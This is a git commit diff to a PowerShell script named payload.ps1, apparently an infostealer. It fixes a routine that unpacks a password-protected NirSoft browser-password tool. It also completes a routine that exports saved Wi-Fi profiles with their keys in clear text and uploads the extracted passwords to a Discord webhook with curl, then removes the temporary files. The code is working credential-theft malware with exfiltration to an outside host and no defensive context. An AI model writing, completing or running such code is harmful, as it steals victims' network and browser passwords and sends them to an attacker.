e8e693becb722c2f0446bd214fa84d68681883d9
n26 c <151398812+af39h6q78@users.noreply.github.com>
2025-07-22 23:44:49 +0200

    fixed Get-Nirsoft and slight improvements

--- payload.ps1
+++ payload.ps1
@@ -11,7 +11,7 @@ function Get-Nirsoft {
 
   Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
   Expand-Archive 7z.zip
-  .\7z\7za.exe e wbpv.zip
+  .\7z\7za.exe e wbpv.zip -pwbpv28821@ #! change ts if the password on line 8 changes
 
 }
 
@@ -38,14 +38,18 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl  -Method Post
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $DiscordUrl}
 }
 
-function Wifi { #todo fix ts
+function Wifi {
 New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"
 Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=clear
 Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > $desktop\0.txt
+
+
 Upload-Discord -file "$desktop\0.txt" -text "Wifi password :"
 Set-Location -Path "$env:temp"
 Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt
 }
+
+
 
  function Del-Nirsoft-File {
   cd C:\
@@ -60,6 +64,3 @@ function version-av {
   cd C:\
   rmdir -R \temp
 }
-
-
-
